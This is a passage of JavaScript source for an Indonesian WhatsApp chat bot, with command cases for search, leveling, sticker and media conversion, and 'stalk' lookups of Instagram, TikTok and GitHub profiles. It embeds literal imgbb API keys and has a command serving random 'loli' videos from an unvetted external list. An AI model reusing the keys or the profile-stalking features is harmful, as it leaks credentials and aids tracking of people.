\`\`\`▢ Lokasi : ${get_data[i].location}\`\`\`
\`\`\`▢ Deskripsi*: ${get_data[i].desc}\`\`\`
\`\`\`▢ Stok : ${get_data[i].stock}\`\`\`
\`\`\`▢ Informasi : ${get_data[i].information}\`\`\`
\`\`\`▢ Link : ${get_data[i].url}\`\`\``
}
              ini_buffer = await getBuffer(get_data[0].img_detail[0])
              Hisnu.sendMessage(from, ini_buffer, image, { quoted: mek, caption: teks })
              } catch {
              reply(`Maaf produk ${query} tidak ditemukan`)
}
              break
       case 'playstore':
              try {
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              if (args.length == 0) return reply(`Kirim perintah *${prefix}playstore [ apk ]*\nContoh : ${prefix}playstore pubg`)
              query = args.join(" ")
              reply(mess.wait)
              get_result = await fetchJson(`https://api.zeks.xyz/api/sgplay?apikey=${setting.zekskey}&q=${query}`)
              get_result = get_result.result
              teks = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *PLAYSTORE*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*\n`
for(let i = 0; i < get_result.length; i++) {
teks += `\`\`\`▢ Title : ${get_result[i].title}\`\`\`
\`\`\`▢ Harga : ${get_result[i].price}\`\`\`
\`\`\`▢ Rate : ${get_result[i].rating}\`\`\`
\`\`\`▢ Link : ${get_result[i].url}\`\`\`

`
}
              ini_buffer = await getBuffer(get_result[0].thumb)
              Hisnu.sendMessage(from, ini_buffer, image, { quoted: mek, caption: teks })
              } catch {
              reply(`Maaf aplikasi ${query} tidak ditemukan`)
}
              break
       case 'yts':
       case 'ytsearch':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              if (!q) return reply(mess.wrongFormat)
              reply(mess.wait)
              try {
              res = await yts(q)
              a = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE SEARCH*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*\n`
for (let i of res.all) {
a += `\`\`\`▢ Title : ${i.title}\`\`\`
\`\`\`▢ Views : ${i.views}\`\`\`
\`\`\`▢ Upload : ${i.ago}\`\`\`
\`\`\`▢ Durasi : ${i.timestamp}\`\`\`
\`\`\`▢ Channel : ${i.author.name}\`\`\`
\`\`\`▢ Link : ${i.url}\`\`\``
}
               b = a.trim()
               sendFileFromUrl(res.all[0].image, image, {quoted: mek, caption: b})
               } catch (e) {
               console.log(e)
               reply(`${e}`)
}
               break
       case 'tourl':
               if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
               if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
               reply(mess.wait)
               boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
               owgi = await Hisnu.downloadMediaMessage(boij)
               res = await uploadImages(owgi)
               reply(res)
               } else {
               reply('kirim/reply gambar/video')
}
               break
       case 'imgtourl':
       case 'img2url':
               if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
               reply(mess.wait) 
               var imgbb = require('imgbb-uploader')
               var encmedia  = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
               var media = await  Hisnu.downloadAndSaveMediaMessage(encmedia)       
               imgbb('39d895963468b814fad0514bd28787e2', media)
              .then(data => {
               var caps = `*_IMAGE TO URL_*\n\n*~>  ID :* ${data.id}\n*~>  MimeType :* ${data.image.mime}\n*~>  Extension :* ${data.image.extension}\n*~>  URL :* ${data.display_url}`
               ibb = fs.readFileSync(media)
               Hisnu.sendMessage(from, ibb, image, { quoted: mek, caption: caps})
})
              .catch(err => {
               throw err
})
               break
         case 'asupan': // shansekai  
               if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')        
               reply(mess.wait)
               asupan()
              .then(async (body) => {
               asupann = body.split('\n')
               asupanx = asupann[Math.floor(Math.random() * asupann.length)]
               sendMediaURL(from, `http://sansekai.my.id/ptl_repost/${asupanx}`, 'Follow IG: https://www.instagram.com/ptl_repost untuk mendapatkan asupan lebih banyak.')
               console.log('Success sending video!')
})
              .catch(async (err) => {
               console.log(err)
               reply(`${err}`)
})
               break
        // case 'nulis':
        // case 'tulis':
               // if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
               // if (args.length < 1) return reply('Yang mau di tulis apaan?')
               // teks = args.join(' ')
               // reply(mess.wait)
               // nulis = encodeURIComponent(teks)
               // res = await axios.get(`https://dt-04.herokuapp.com/nulis?text=${nulis}`)
               // if (res.data.error) return reply(res.data.error)
               // buff = Buffer.from(res.data.result.split(',')[1], 'base64')
               // Hisnu.sendMessage(from, buff, image, {quoted: mek, caption: mess.success}).catch(e => {
               // return reply('_[ ! ] Error Gagal Dalam Mendownload Dan Mengirim File_')
// })
               // break
//------------------< Level >-------------------
      case 'level': 
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              if (!isGroup) return reply(mess.only.group)
              if (!isLevelingOn) return await reply('Fitur leveling belum diaktifkan!')
              let userLevel = level.getLevelingLevel(sender, _level)
              let userXp = level.getLevelingXp(sender, _level)
              let requiredXp = 10 * Math.pow(userLevel, 2) + 50 * userLevel + 100
              let userRank = level.getUserRank(sender, _level)
              try {
              profilePic = await Hisnu.getProfilePicture(sender)
              } catch {
              profilePic = errorImg
}
              buffer = await getBuffer(`https://lolhuman.herokuapp.com/api/rank?apikey=${setting.lolkey}&img=${profilePic}&background=https://telegra.ph/file/443b6600636aed1d94acd.jpg&username=${encodeURI(pushname)}&level=${userLevel}&ranking=${Number(userRank)}&currxp=${userXp}&xpneed=${requiredXp}`)
              teks = `*「 LEVEL 」*\n\n➸ *Nama :* ${pushname}\n➸ *Xp :* ${userXp} / ${requiredXp}\n➸ *Level :* ${userLevel}\n➸ *Role*: *${role}*\n\n*Note : Kumpulin Xp Jika Ingin Menaikkan Level*`
              Hisnu.sendMessage(from, buffer, image, { caption: teks, quoted: mek})
              break
       case 'leaderboard': //Cek Leaderboard
       case 'leaderboards':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              if (!isGroup) return reply(mess.only.group)
              if (!isLevelingOn) return await reply('Fitur leveling belum diaktifkan!') 
              const resp = _level
            _level.sort((a, b) => (a.xp < b.xp) ? 1 : -1)
              let leaderboard =  '-----[ *LEADERBOARD* ]----\n\n'
              try {
              for (let i = 0; i < 10; i++) {
              var roles = 'Warrior III'
              if (resp[i].level <= 5) {
              roles = 'Warrior II'
              } else if (resp[i].level <= 10) {
              roles = 'Warrior I'
              } else if (resp[i].level <= 15) {
              roles = 'Elite III'
              } else if (resp[i].level <= 20) {
              roles = 'Elite II'
              } else if (resp[i].level <= 25) {
              roles = 'Elite I'
              } else if (resp[i].level <= 30) {
              roles = 'Master III'
              } else if (resp[i].level <= 35) {
              roles = 'Master II'
              } else if (resp[i].level <= 40) {
              roles = 'Master I'
              } else if (resp[i].level <= 45) {
              roles = 'GrandMaster III'
              } else if (resp[i].level <= 50) {
              roles = 'GrandMaster II'
              } else if (resp[i].level <= 55) {
              roles = 'GrandMaster I'
              } else if (resp[i].level <= 60) {
              roles = 'Epic III'
              } else if (resp[i].level <= 65) {
              roles = 'Epic II'
              } else if (resp[i].level <= 70) {
              roles = 'Epic I'
              } else if (resp[i].level <= 75) {
              roles = 'Legend III'
              } else if (resp[i].level <= 80) {
              roles = 'Legend II'
              } else if (resp[i].level <= 85) {
              roles = 'Legend I'
              } else if (resp[i].level <= 90) {
              roles = 'Mythic'
              } else if (resp[i].level <= 95) {
              roles = 'Mythical Glory'
              } else if (resp[i].level >= 100) {
              roles = 'Immortal'
} 

              leaderboard += `➸ ${i + 1}. wa.me/${_level[i].id.replace('@s.whatsapp.net', '')}\n➸ *Xp :* ${_level[i].xp}\n➸ *Level :* ${_level[i].level}\n➸ *Role :* ${roles}\n\n`
}
              reply(leaderboard)
              } catch (err) {
              console.error(err)
              reply('_Perlu setidaknya 10 user yang memiliki level di database!_')
}
              break
//------------------< Stalk >-------------------
      case 'stalkgithub':
      case 'githubstalk':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              if (args.length == 0) return reply(`Example: ${prefix + command} Hisnu-chan02`)
              reply(mess.wait)
              username = args[0]
              ini_result = await fetchJson(`https://api.lolhuman.xyz/api/github/${username}?apikey=${setting.lolkey}`)
              ini_result = ini_result.result
              ini_buffer = await getBuffer(ini_result.avatar)
              ini_txt = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *GITHUB USER*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Username : ${ini_result.name}\`\`\`
\`\`\`▢ Public Repo : ${ini_result.public_repos}\`\`\`
\`\`\`▢ Public Gists : ${ini_result.public_gists}\`\`\`
\`\`\`▢ Pengikut : ${ini_result.followers}\`\`\`
\`\`\`▢ Following : ${ini_result.following}\`\`\`
\`\`\`▢ Mengikuti : ${ini_result.bio}\`\`\`
\`\`\`▢ Link : ${ini_result.url}\`\`\`
`
             Hisnu.sendMessage(from, ini_buffer, image, { caption: ini_txt, thumbnail: Buffer.alloc(0) })
             break
      case 'stalkig':
      case 'igstalk':
             if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
             if (args.length == 0) return reply(`Example: ${prefix + command} Hisnu.chan26`)
             reply(mess.wait)
             username = args[0]
             ini_result = await fetchJson(`https://api.lolhuman.xyz/api/stalkig/${username}?apikey=${setting.lolkey}`)
             ini_result = ini_result.result
             ini_buffer = await getBuffer(ini_result.photo_profile)
             ini_txt = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *INSTAGRAM PROFILE*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Username : ${ini_result.username}\`\`\`
\`\`\`▢ Nama : ${ini_result.fullname}\`\`\`
\`\`\`▢ Pengikut : ${ini_result.followers}\`\`\`
\`\`\`▢ Mengikuti : ${ini_result.following}\`\`\`
\`\`\`▢ Deskripsi : ${ini_result.bio}\`\`\`
\`\`\`▢ Link : https://instagram.com/${ini_result.username}\`\`\`
`
             Hisnu.sendMessage(from, ini_buffer, image, { caption: ini_txt, thumbnail: Buffer.alloc(0) })
             break
      case 'stalktiktok':
      case 'tiktokstalk':
             if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
             if (args.length == 0) return reply(`Example: ${prefix + command} marz.hiatus`)
             reply(mess.wait)
             stalk_toktok = args[0]
             get_result = await fetchJson(`http://lolhuman.herokuapp.com/api/stalktiktok/${stalk_toktok}?apikey=${setting.lolkey}`)
             get_result = get_result.result
             pp_tt = await getBuffer(get_result.user_picture)
             ini_txt = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *TIKTOK PROFILE*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Username : ${get_result.username}\`\`\`
\`\`\`▢ Nama : ${get_result.nickname}\`\`\`
\`\`\`▢ Pengikut : ${get_result.followers}\`\`\`
\`\`\`▢ Mengikuti : ${get_result.followings}\`\`\`
\`\`\`▢ Likes : ${get_result.likes}\`\`\`
\`\`\`▢ Video : ${get_result.video}\`\`\`
\`\`\`▢ Deskripsi : ${get_result.bio}\`\`\`
`
              Hisnu.sendMessage(from, pp_tt, image, { quoted: mek, caption: ini_txt, thumbnail: Buffer.alloc(0) })
              break
       case 'iguser':
              try {
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              if (args.length == 0) return reply(`Kirim perintah *${prefix}iguser [ username ]*\nContoh : ${prefix}iguser jessnolimit`)
              query = args.join(" ")
              reply(mess.wait)
              get_result = await fetchJson(`https://api.zeks.xyz/api/iguser?apikey=${setting.zekskey}&q=${query}`)
              get_result = get_result.result
              teks = `*「 INSTAGRAM USER 」*\n\n*Hasil Pencarian : ${query}*\n\n`
              for(let i = 0; i < get_result.length; i++) {
              teks += `*Username* : ${get_result[i].username}\n*Full name*: ${get_result[i].full_name}\n*Akun private* : ${get_result[i].private_user}\n*Verified*: ${get_result[i].verified_user}\n*Link*: https://instagram.com/${get_result[i].username}\n\n`
}
              ini_buffer = await getBuffer(get_result[0].profile_pic)
              Hisnu.sendMessage(from, ini_buffer, image, { quoted: mek, caption: teks })
              } catch {
              reply(`Maaf username ${query} tidak ditemukan`)
}
              break
//------------------< Sticker/Tools >-------------------

       case 'dadu': // by CHIKAA CHANTEKKXXZZ
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              reply(mess.wait)
              dadu()
             .then(async (body) => {
              dadugerak = body.split('\n')
              dadugerakx = dadugerak[Math.floor(Math.random() * dadugerak.length)]
              sendWebp(from, dadugerakx)
})
             .catch(async (err) => {
              console.error(err)
              reply('Error!')
})
              break
      case 'doge':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              reply(mess.wait)
              fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/anjing')
             .then(res => res.text())
             .then(body => {
              let tod = body.split("\n");
              let pjr = tod[Math.floor(Math.random() * tod.length)];
              sendWebp(from, pjr)
}
)
              break
       case 'patrik':
       case 'patrick':      
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              reply(mess.wait)
              fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/patrik')
             .then(res => res.text())
             .then(body => {
              let tod = body.split("\n");
              let pjr = tod[Math.floor(Math.random() * tod.length)];
              sendWebp(from, pjr)
}
)
              break
       case 'gura':
       case 'gawrgura':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              reply(mess.wait)
              fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/gura')
             .then(res => res.text())
             .then(body => {
              let tod = body.split("\n");
              let pjr = tod[Math.floor(Math.random() * tod.length)];
              sendWebp(from, pjr)
}
)
              break
       case 'animestick':
       case 'stickeranime':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              reply(mess.wait)
              fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/animestick')
             .then(res => res.text())
             .then(body => {
              let todd = body.split("\n");
              let pjrr = todd[Math.floor(Math.random() * todd.length)];
              sendWebp(from, pjrr)
}
)
              break
       case 'telesticker': 
       case 'telestiker':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              if (!q) return reply(`Example: ${prefix + command} https://t.me/addstickers/LINE_Menhera_chan_ENG`)
              reply(mess.wait)
              ini_url = await fetchJson(`https://api.lolhuman.xyz/api/telestick?apikey=${setting.lolkey}&url=${args[0]}`)
              ini_sticker = ini_url.result.sticker
              reply('Sending '+ ini_sticker.length +' stickers...')
              for (sticker_ in ini_sticker) {
              ini_buffer = await getBuffer(ini_sticker[sticker_])
              Hisnu.sendMessage(from, ini_buffer, sticker, {})
}
              break
       case 'semoji':
       case 'emoji':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              if (args.length == 0) return reply(`Example: ${prefix + command} ðŸ˜­`)
              emoji = args[0]
              try {
              emoji = encodeURI(emoji[0])
              } catch {
              emoji = encodeURI(emoji)
 }
              ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/smoji/${emoji}?apikey=${setting.lolkey}`)
              await Hisnu.sendMessage(from, ini_buffer, sticker, { quoted: mek })
              break
case 'ttp':
if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
if (args.length < 1) return reply(`teksnya mana bruh?\ncontoh ${prefix} ${pushname}`)
woy = args.join(" ")
reply('wait....')
anjay = `http://zekais-api.herokuapp.com/text2png?text=${woy}&color=white`
sendStickerUrl(from, anjay)
break
       case 'attp':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              if (args.length == 0) return reply(`Example: ${prefix + command} Hisnu`)
              buffer = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURI(q)}`)
              Hisnu.sendMessage(from, buffer, sticker, { quoted: mek })
              break
       case 'ttg':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              if (!q) return await reply(mess.wrongFormat)
              reply(mess.wait)
              sendWebp(from, `https://api.vhtear.com/textxgif?text=${q}&apikey=${setting.vhtearkey}`)
             .then(() => console.log('Success creating GIF!'))
             .catch(async (err) => {
              console.error(err)
              reply('Error!')
})
              break
       case 'loliv':
       case 'lolivid':
       case 'lolivideo':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              reply(mess.wait)
              anu = await fetchText('https://raw.githubusercontent.com/AlvioAdjiJanuar/random/main/loli.txt')
             .then(async (body) => {
              anu = body.split('\n')
              anu = anu[Math.floor(Math.random() * anu.length)]
              sendMediaURL(from, anu)
})
             .catch(async (err) => {
              console.error(err)
              reply(`${err}`)
})
              break
       case 'gifstiker':
	   case 's':
       case 'stickergif':  
	   case 'sticker':
	   case 'stiker':
            if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
		    if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
            const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            const media = await Hisnu.downloadAndSaveMediaMessage(encmedia)
                ran = '666.webp'
                await ffmpeg(`./${media}`)
                .input(media)
                .on('start', function (cmd) {
                     console.log(`Started : ${cmd}`)
                })
                .on('error', function (err) {
                 console.log(`Error : ${err}`)
                fs.unlinkSync(media)
                reply('error')
                })
                .on('end', function () {
                console.log('Finish')
                Hisnu.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: mek})
                 fs.unlinkSync(media)
                fs.unlinkSync(ran)
                })
                .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                .toFormat('webp')
                .save(ran)
                } else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
                const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                const media = await Hisnu.downloadAndSaveMediaMessage(encmedia)
            ran = '999.webp'
            reply(mess.wait)
            await ffmpeg(`./${media}`)
            .inputFormat(media.split('.')[1])
            .on('start', function (cmd) {
            console.log(`Started : ${cmd}`)
            })
            .on('error', function (err) {
            console.log(`Error : ${err}`)
            fs.unlinkSync(media)
            tipe = media.endsWith('.mp4') ? 'video' : 'gif'
            reply(`Gagal, pada saat mengkonversi ${tipe} ke stiker`)
            })
            .on('end', function () {
            console.log('Finish')
            Hisnu.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: mek})
            fs.unlinkSync(media)
            fs.unlinkSync(ran)
                })
                .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                .toFormat('webp')
                .save(ran)
            } else {
                reply(`Kirim gambar dengan caption ${prefix}sticker\nDurasi Sticker Video 1-9 Detik`)
            }
            break               
       case 'take':
       case 'colong':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              if (!isQuotedSticker) return reply('Stiker aja om')
              encmedia = JSON.parse(JSON.strngify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
              media = await Hisnu.downloadAndSaveMediaMessage(encmedia)
              anu = args.join(' ').split('|')
              satu = anu[0] !== '' ? anu[0] : `${pushname}`
              dua = typeof anu[1] !== 'undefined' ? anu[1] : `UwU`
              require('./lib/fetch.js').createExif(satu, dua)
              require('./lib/fetch.js').modStick(media, Hisnu, mek, from)
              break
       // case 'delwm':
              // if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              // if (!isQuotedSticker) return reply('Stiker aja om')
              // encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
              // media = await Hisnu.downloadAndSaveMediaMessage(encmedia)
              // anu = args.join(' ').split('|')
              // satu = anu[0] !== '' ? anu[0] : ``
              // dua = typeof anu[1] !== 'undefined' ? anu[1] : ``
              // require('./lib/fetch.js').createExif(satu, dua)
              // require('./lib/fetch.js').modStick(media, Hisnu, mek, from)
              // break
       case 'stikerwm':
       case 'stickerwm':
       case 'swm':
       case 's2':
              var a = arg.split("|")[0];
              var b = arg.split("|")[1];
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              if (isMedia && !mek.message.videoMessage || isQuotedImage ) {
              const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
              media = await Hisnu.downloadAndSaveMediaMessage(encmedia)
              await createExif(a,b)
              out = getRandom('.webp')
              ffmpeg(media)
             .on('error', (e) => {
              console.log(e)
              Hisnu.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: mek })
              fs.unlinkSync(media)
})
             .on('end', () => {
            _out = getRandom('.webp')
              spawn('webpmux', ['-set','exif','./sticker/data.exif', out, '-o', _out])
             .on('exit', () => {
              Hisnu.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: mek })
              fs.unlinkSync(out)
              fs.unlinkSync(_out)
              fs.unlinkSync(media)
})
})
             .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
             .toFormat('webp')
             .save(out) 
              } else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
              const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
              const media = await Hisnu.downloadAndSaveMediaMessage(encmedia)
              pe = args.join('')
              var a = pe.split("|")[0];
              var b = pe.split("|")[1];
              await createExif(a,b)
              out = getRandom('.webp')
              ffmpeg(media)
             .on('error', (e) => {
              console.log(e)
              Hisnu.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: mek })
              fs.unlinkSync(media)
})
             .on('end', () => {
            _out = getRandom('.webp')
              spawn('webpmux', ['-set','exif','./sticker/data.exif', out, '-o', _out])
             .on('exit', () => {
              Hisnu.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: mek })
              fs.unlinkSync(out)
              fs.unlinkSync(_out)
              fs.unlinkSync(media)
})
})
             .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
             .toFormat('webp')
             .save(out)       
              } else {
              reply(`Kirim gambar dengan caption ${prefix}swm teks|teks atau tag gambar yang sudah dikirim`)
}
              break
      case 'toimg':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              if (!isQuotedSticker) return reply('reply stickernya')
              reply(mess.wait)
              encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
              media = await Hisnu.downloadAndSaveMediaMessage(encmedia)
              ran = getRandom('.png')
              exec(`ffmpeg -i ${media} ${ran}`, (err) => {
              fs.unlinkSync(media)
              if (err) return reply('Gagal, pada saat mengkonversi sticker ke gambar')
              buffer = fs.readFileSync(ran)
              Hisnu.sendMessage(from, buffer, image, {quoted: mek, caption: 'Nih'})
              fs.unlinkSync(ran)
})
              break
case 'smeme': 
if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')       
reply('Loading.... ')
top = arg.split('|')[0]
bottom = arg.split('|')[1]
var imgbb = require('imgbb-uploader')
if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length > 0) {
ger = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
owgi = await  Hisnu.downloadAndSaveMediaMessage(ger)
anu = await imgbb("cedeb44b8d204947a6833ca1412ca77d", owgi)
teks = `${anu.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu1 = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${teks}`
sendStickerUrl(from, `${anu1}`)
} else {
reply('Gunakan foto/stiker!')
}
break

       case 'memeimg':
       case 'memegen':                    
              top = arg.split('|')[0]
              bottom = arg.split('|')[1]
              var imgbb = require('imgbb-uploader')
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length > 0) {
              reply(mess.wait)
              ger = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
              owgi = await Hisnu.downloadAndSaveMediaMessage(ger)
              anu = await imgbb("39d895963468b814fad0514bd28787e2", owgi)
              teks = `${anu.display_url}`
              ranp = getRandom('.gif')
              rano = getRandom('.webp')
              anu1 = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${teks}`
              sendMediaURL(from, `${anu1}`, mess.success)
              } else {
              reply('Gunakan foto/stiker!')
}
               break
        case 'togif':
               if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
               if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
               reply(mess.wait)
               encmediaaa = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
               mediaaa = await Hisnu.downloadAndSaveMediaMessage(encmediaaa)
               a = await webp2gifFile(mediaaa)
               mp4 = await getBuffer(a.result)
               Hisnu.sendMessage(from, mp4, video, {mimetype: 'video/gif', quoted: mek, caption: mess.success})
               fs.unlinkSync(mediaaa)
               } else {
               reply(mess.wrongFormat)
}
               break
        case 'tovideo':
               if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
               if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
               reply(mess.wait)
               encmediaaa = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
               mediaaa = await Hisnu.downloadAndSaveMediaMessage(encmediaaa)
               a = await webp2gifFile(mediaaa)
               mp4 = await getBuffer(a.result)
               Hisnu.sendMessage(from, mp4, video, {mimetype: 'video/mp4', quoted: mek, caption: mess.success})
               fs.unlinkSync(mediaaa)
               } else {
               reply(mess.wrongFormat)
}
               break
        case 'tomp3':
               if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
               if (isQuotedVideo || isQuotedAudio){
               reply(mess.wait)
               encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
               media = await Hisnu.downloadAndSaveMediaMessage(encmedia)
               ran = getRandom('.mp3')
               exec(`ffmpeg -i ${media} ${ran}`, (err) => {
               fs.unlinkSync(media)
               if (err) return reply(`Err: ${err}`)
               buffer453 = fs.readFileSync(ran)
               Hisnu.sendMessage(from, buffer453, audio, { mimetype: 'audio/mp4', quoted: mek })
               fs.unlinkSync(ran)
})
               } else {
